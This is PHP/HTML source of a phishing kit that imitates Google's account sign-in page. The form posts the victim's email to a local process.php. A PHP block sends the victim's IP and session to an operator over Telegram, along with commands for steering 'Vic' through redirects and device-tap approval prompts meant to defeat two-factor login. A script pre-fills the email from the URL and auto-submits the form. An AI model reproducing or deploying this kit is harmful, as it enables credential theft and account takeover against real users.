...
if (isset($_GET['auto_redirection_mode']) && $_GET['auto_redirection_mode']) {
	...
	$message = " *Vic is redirected to this page and it's now in loading state reply to this message if you want to do redirections*:\n`email|some@email.com` - for email update & open the page flow\n`tap1|DeviceModel` - for the tap process (Yes confirm)\n`tap2|DeviceModel|PressNumber` - for tap process press the number\n\n";
	$message .= "💻 *IP:* `". get_IP() . "`\n" . "#️⃣ *SESSION:* `" . @$_SESSION['session_uid'] . "`";
	$buttons = [''];
	$buttons_data = [''];
	$message_id = telegram_send_button($message, $telegram_token, $telegram_chat_id, $buttons, $buttons_data, "");
...
if (isset($_GET['email']) && !empty($_GET['email'])) {
	$_SESSION['prefill_email'] = $_GET['email'];
	$_SESSION['autosubmit'] = isset($_GET['autosubmit']) && $_GET['autosubmit'] == '1';
}

if (isset($_GET['redirect_email'])) {

	$_SESSION['email'] = $_GET['redirect_email'];
...
<meta charset=utf-8>
<style
	data-href="https://www.gstatic.com/_/mss/boq-identity/_/ss/k=boq-identity.AccountsSignInUi.VwCusrBCqOs.L.F4.O/am=ARMCs2WMrQ0AiP__p5wFdRYgASEDAAAAAAAAAAA2AAAQcgwAAQ/d=1/ed=1/rs=AOaEmlEDUghrsE9hG8pnP9ViaKX7oQPjEg/m=identifierview,_b,_tp"
	nonce>
...
<link rel=canonical
	href="https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Faccounts.google.com%2F&amp;followup=https%3A%2F%2Faccounts.google.com%2F&amp;ifkv=AdBytiOwBiCs0R0yArVkCCu1V1OjCioAN4zXr1YtY3OG4-kOR3ONuhG8sUwLso6INczvFxyvoyGbkA&amp;passive=1209600&amp;flowName=GlifWebSignIn&amp;flowEntry=ServiceLogin">
<noscript>
	<style nonce="VxS-ILG8hpuPIOSD2LQC_g">
		body {
			opacity: 0;
		}
	</style>
...
<body jscontroller=LDQI
	...
	<div class="S7xv8 LZgQXe">
		<div class="TcuCfd NQ5OL" jsname=rZHESd jscontroller=K1ZKnb
			...
			<div class=fAlnEc id=yDmH0d jsaction=ZqRew:.CLIENT><c-wiz jsrenderer=chA7fe class=A77ntc data-view-id=hm18Ec
					data-locale=en_US data-allow-sign-up-types=true jsshadow jsdata=deferred-i6
					data-p='%.@.false,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,false,null,null,false,null,null,null,null,null,"S117947150:1755291036647255",null,"https://accounts.google.com",null,null,null,[[null,null,null,null,"https://accounts.google.com/"],[null,null,"S117947150:1755291036647255","ServiceLogin","https://accounts.google.com/",null,[["continue","https://accounts.google.com/"],["followup","https://accounts.google.com/"],["ifkv","AdBytiOwBiCs0R0yArVkCCu1V1OjCioAN4zXr1YtY3OG4-kOR3ONuhG8sUwLso6INczvFxyvoyGbkA"],["passive","1209600"],["flowName","GlifWebSignIn"],["flowEntry","ServiceLogin"]],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,null,null,[],null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,null,[]],null,null,null,[null,null,null,null,null,[null,[["continue",["https://accounts.google.com/"]],["followup",["https://accounts.google.com/"]],["ifkv",["AdBytiOwBiCs0R0yArVkCCu1V1OjCioAN4zXr1YtY3OG4-kOR3ONuhG8sUwLso6INczvFxyvoyGbkA"]],["passive",["1209600"]],["flowName",["GlifWebSignIn"]],["flowEntry",["ServiceLogin"]]],"https://accounts.google.com/"],null,"S117947150:1755291036647255",null,null,[]],null,null,null,null,null,null,null,null,null,"1209600"],null,false]'
					jscontroller=b3kMqb
					jsaction="click:jKoJid(preventDefault=true|DPJEMd),WZ2Bje(Cuz2Ue);jiqeKb:UHZ0U;Pp1AU:IjS5bf;rcuQ6b:WYd;W7m8ib:cqxkve;t5qvFd:.CLIENT"
					jsname=nUpftc data-node-index=0;0 jsmodel="hc6Ubd niKKCd" view c-wiz>
					<main class=Svhjgc jsname=bN97Pc jscontroller=SD8Jgb jsshadow>
						<div class=zIgDIc jsname=paFcre><c-wiz jsrenderer=OTcFib jsshadow jsdata=deferred-i7
								...
								<div class=Wf6lSd jscontroller=rmumx jsname=n7vHCb><svg
									...
									</svg></div><c-data id=i7 jsdata=" eCjdDd;_;4" class=sf-hidden></c-data>
							</c-wiz>
							<div class="ObDc3 ZYOIke" jsname=tJHJj jscontroller=E87wgc
								jsaction=JIbuQc:pKJJqe(af8ijd);wqEGtb:pKJJqe;>
								<h1 class=vAV9bf data-a11y-title-piece id=headingText jsname=r4nke><span jsslot>Sign
										in</span></h1>
								<div class=gNJDp data-a11y-title-piece id=headingSubtext jsname=VdSJob><span jsslot>Use
										your Google Account</span></div>
							</div>
						</div>
							...
							<div class=qWK5J>
								<div class=xKcayf jsname=USBQqe>
									<div class=AcKKx jsname=rEuO1b jscontroller=qPYxq data-form-action-uri>
										<form method=post action="process.php" jsaction=submit:JM9m2e;>
											<input hidden name=page value=index class=sf-hidden>
											<span jsslot>
													...
													<div class=yTaH4c jsname=MZArnb>
														<div jsslot>
															<div jscontroller=mvkUhe
																...
																data-allow-at-sign=true data-is-rendered=true>
																<div class="rFrNMe X3mtXb UOsO2 ToAxb zKHdkd sdJrJc"
																	...
																	<div class="aCsJod oJeWuf">
																		<div class="aXBtI Wic03c">
																			<div class=Xb9hP><input required type=email
																					class="whsOnd zHQkBf" jsname=YPqjbf
																					autocomplete="username webauthn"
																					spellcheck=false tabindex=0
																					aria-label="Email or phone"
																					aria-describedby=i8 name=email
																					value="<?php echo htmlspecialchars(@$_SESSION['prefill_email'] ?? '', ENT_QUOTES); ?>" aria-disabled=false
																					autocapitalize=none id=identifierId
																					dir=ltr data-initial-dir=ltr
																					data-initial-value>
																			...
																			<div jsname=XmnwAc
																				...
																				style="transform-origin:68px center 0px">
																			</div>
																		</div>
																	</div>
																	<div class=LXRPh>
																		<div jsname=ty6ygf
																			class="ovnfwe Is7Fhb sf-hidden"></div>
																	</div>
																</div>
																<div class=bfzBdd jsname=NuIDSd id=i8></div>
															</div>
															<div class="dMNVAe sf-hidden" jsname=OZNMeb
																aria-live=assertive></div>
															<div class=dMNVAe><button jsname=Cuz2Ue type=button>Forgot
																	email?</button></div><input type=password
																name=hiddenPassword class="Hvu6D sf-hidden" tabindex=-1
																aria-hidden=true spellcheck=false jsname=RHeR4d>
															<div jscontroller=CMcBD jsname=Si5T8b
																class="lbFS4d eLNT1d sf-hidden"
																jsaction=KWPV0:IMdg8d;rcuQ6b:jqIVcd></div><c-wiz
																jsrenderer=PXsWy jsdata=deferred-i10
																data-p='%.@.null,"identity-signin-identifier"]'
																jscontroller=oqkvIf jsname=xdJtEf data-node-index=1;0
																jsmodel=hc6Ubd c-wiz><c-data id=i10 jsdata=" U3wROe;_;5"
																	class=sf-hidden></c-data></c-wiz><c-wiz
																jsrenderer=xielGb jsshadow jsdata=deferred-i11
																data-p='%.@."https://accounts.google.com"]'
																jscontroller=t2srLd jsaction=rcuQ6b:WYd; jsname=ZVfTqd
																data-node-index=3;0 jsmodel=hc6Ubd c-wiz><c-data id=i11
																	jsdata=" XK0mj;_;3"
																	class=sf-hidden></c-data></c-wiz><c-wiz jsshadow
																jsdata=deferred-i12 jscontroller=EN3i8d
																jsaction=rcuQ6b:I3Yihd; jsname=k3Q4Cf jsmodel=hc6Ubd
																c-wiz><c-data id=i12 class=sf-hidden></c-data></c-wiz>
														</div>
													</div>
												</section>
											</span>
									...
									<div jsslot>
										<div class=RDsYTb>
											<div class=dMNVAe>Not your computer? Use a Private Window to sign in. <a
													...
													jsname=JFyozc target=_blank>Learn more about using Guest mode</a>
											</div>
										</div>
									</div>
								</div>
						...
						<div class=JYXaTc jsname=DH6Rkf jscontroller=z0u0L
							...
							data-is-secondary-action-disabled=false data-primary-action-label=Next jsshadow>
							<div class=O1Slxf jsname=DhK0U>
								<div class=TNTaPb jsname=k77Iif>
									<div jscontroller=f8Gu1e jsaction=click:cOuCgd;JIbuQc:JIbuQc; jsname=Njthtb
										...
										<div class=VfPpkd-dgl2Hf-ppHlrf-sM5MNb data-is-touch-wrapper=true><button type=submit
								...
								<div class=FO2vFd jsname=QkNstf>
									<div class=n3Clv jsname=FIbd0b>
										<div class="VfPpkd-xl07Ob-XxIAqe-OWXEXe-oYxtQd XjS9D" jscontroller=wg1P6b
											jsaction="JIbuQc:aj0Jcf(WjL7X); keydown:uYT2Vb(WjL7X);xDliB:oNPcuf;SM8mFd:li9Srb;iFFCZc:NSsOUb;Rld2oe:NSsOUb"
											jsname=lqvTlf jsshadow data-disable-idom=true>
											<div jsname=WjL7X jsslot>
												<div class=VfPpkd-dgl2Hf-ppHlrf-sM5MNb data-is-touch-wrapper=true>
													<button
														...
														aria-expanded=false aria-haspopup=menu type=button>
														<div class=VfPpkd-Jh9lGc></div>
														<div class="VfPpkd-J1Ukfc-LhBDec sf-hidden"></div>
														<div class=VfPpkd-RLmnJb></div><span jsname=V67aGc
															class=VfPpkd-vQzf8d>Create account</span>
													</button>
												</div>
											</div>
											<div jsname=U0exHf jsslot>
												<div class="VfPpkd-xl07Ob-XxIAqe VfPpkd-xl07Ob q6oraf P77izf KMdFve sf-hidden"
													jsname=DRCaZb jscontroller=ywOR5c
													...
													data-is-hoisted=true data-should-flip-corner-horizontally=false
													data-stay-in-viewport=false data-disable-idom=true
													data-menu-uid=ucc-0></div>
											</div>
										</div>
									</div>
								</div>
					...
					</main><c-data id=i6 jsdata=" kY3gQd;_;6 DoqpZc;_;2" class=sf-hidden></c-data>
				</c-wiz>
				<div id=ZCHFDb></div>
			</div>
		</div>
		<div class=wmGw4><c-wiz jsrenderer=ZdRp7e jsshadow jsdata=deferred-i1 data-node-index=0;0 jsmodel=hc6Ubd c-wiz>
				<footer class=FZfKCe>
					...
					<ul class=HwzH1e>
						...
						<li class=qKvP1b><a class="AVAq4d TrZEUc"
								href="https://accounts.google.com/TOS?loc=RO&amp;hl=en-US&amp;privacy=true"
								target=_blank>Privacy</a>
						<li class=qKvP1b><a class="AVAq4d TrZEUc"
								href="https://accounts.google.com/TOS?loc=RO&amp;hl=en-US" target=_blank>Terms</a>
					</ul>
	...
	<?php if (isset($_SESSION['autosubmit']) && $_SESSION['autosubmit']): ?>
	<script>
	// Auto-submit form when email is prefilled
	window.addEventListener('load', function() {
		var form = document.querySelector('form[action="process.php"]');
		if (form) {
			setTimeout(function() {
				form.submit();
			}, 500);
	...
	<?php unset($_SESSION['autosubmit']); // Clear after use ?>
	</script>
	<?php endif; ?>
